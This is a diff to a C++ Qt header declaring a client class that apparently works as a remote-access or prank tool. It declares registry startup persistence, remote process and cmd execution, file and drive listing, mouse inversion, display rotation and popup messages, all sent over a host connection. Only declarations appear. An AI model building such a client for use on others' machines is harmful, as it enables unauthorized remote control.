@@ -12,6 +12,10 @@
 #include <QDataStream>
 #include <windows.h>
 #include <QtEndian>
+#include <QThread>
+#include <QProcess>
+#include <QStringList>
+#include "qmouseinverter.h"
 
 class QClient : public QObject
 {
@@ -29,12 +33,13 @@ public:
 		DisplayRotate = 6,
 		OsMessage = 7,
 		GetFiles = 8,
+		GetDrives = 9,
 	};
 
 	//Modify registers
 	void addStartup();
 	//Process Execution
-	QString startProcess(const QString &);
+	void startProcess(const QString &);
 	QString runCmdCommand(const QString &);
 	//File Handling
 	QString readFile(const QString &);
@@ -44,6 +49,9 @@ public:
 	void toggleInvertMouse();
 	void rotateDisplay();
 	void message(const QString &);
+
+	QList<QString> getFiles(const QString &);
+	QString getDrives();
 
 	void sendData(const QByteArray &);
 
@@ -61,6 +69,9 @@ private:
 	QString host;
 	QString compName;
 	qint16 port;
+	QThread *thread = Q_NULLPTR;
+	QMouseInverter * worker = Q_NULLPTR;
+	QString dir;
 };
 
 #endif // QCLIENT_H
